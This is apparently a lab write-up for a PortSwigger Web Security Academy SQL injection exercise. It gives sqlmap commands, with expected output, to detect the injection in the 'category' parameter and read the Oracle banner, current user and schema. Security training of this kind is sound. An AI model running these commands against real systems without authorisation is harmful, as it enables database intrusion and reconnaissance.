# SQLMap Verification

## Objective

Verify the SQL Injection vulnerability using SQLMap and identify the backend database type and version.

> **Note:** This lab is solved manually in `README.md`. SQLMap is used only to verify the vulnerability and confirm the Oracle database version.

---

# Lab Information

- **Lab:** SQL Injection Attack, Querying the Database Type and Version on Oracle
- **Target Parameter:** `category`
- **HTTP Method:** GET
- **Backend Database:** Oracle

---

# Target URL

```text
https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories
```

Replace the URL with your own PortSwigger lab URL.

---

# Step 1 - Detect SQL Injection

Run SQLMap against the vulnerable parameter.

```bash
sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories" --batch
```

## Purpose

- Detect SQL Injection automatically.
- Identify the vulnerable parameter.
- Detect the backend DBMS.

### Expected Output

```text
Parameter: category (GET)
Type: UNION query
Backend DBMS: Oracle
```

---

# Step 2 - Retrieve the Database Banner

Retrieve the Oracle database version.

```bash
sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories" --banner --batch
```

## Purpose

- Retrieve the Oracle database banner.
- Display the database version.
- Confirm the backend database.

### Expected Output

```text
banner:
Oracle Database 19c Enterprise Edition Release ...
```

---

# Step 3 - Retrieve Current User (Optional)

Retrieve the current database user.

```bash
sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories" --current-user --batch
```

### Expected Output

```text
current user: APPUSER
```

---

# Step 4 - Retrieve Current Database / Schema (Optional)

Retrieve the current database schema.

```bash
sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories" --current-db --batch
```

### Expected Output

```text
current schema: APPUSER
```

> For Oracle, SQLMap may display the current schema instead of a database name because Oracle organizes objects using schemas.

---

# Expected SQLMap Results

After running the above commands, SQLMap should:

- Detect the SQL Injection vulnerability.
- Identify Oracle as the backend DBMS.
- Display the Oracle database version.
- Retrieve the current database user (optional).
- Retrieve the current schema (optional).

---

# Commands Used

| Command | Purpose |
|---------|---------|
| `sqlmap -u URL --batch` | Detect SQL Injection |
| `sqlmap -u URL --banner --batch` | Retrieve database version |
| `sqlmap -u URL --current-user --batch` | Retrieve current user |
| `sqlmap -u URL --current-db --batch` | Retrieve current schema |

---

# Notes

- This lab is intended to be solved manually.
- SQLMap is used only to verify the vulnerability and retrieve database information.
- Avoid using enumeration commands such as:
  - `--dbs`
  - `--tables`
  - `--columns`
  - `--dump`
- Those commands are unnecessary for this lab because the objective is only to identify the database type and version.

---

# Related Files

- `README.md` – Manual solution
- `../../Database-Queries/Oracle.md` – Oracle SQL Injection guide
- `../../SQLMap-CheatSheet.md` – SQLMap command reference
